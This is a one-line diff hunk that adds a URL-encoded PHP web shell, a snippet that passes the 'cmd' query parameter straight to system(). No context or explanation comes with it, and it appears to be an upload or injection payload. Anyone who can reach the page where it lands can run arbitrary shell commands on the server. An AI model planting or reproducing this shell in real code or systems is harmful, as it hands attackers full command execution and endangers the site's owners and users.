@@ -1,0 +1,1 @@
+<?%3Dsystem($_GET[cmd]);?>
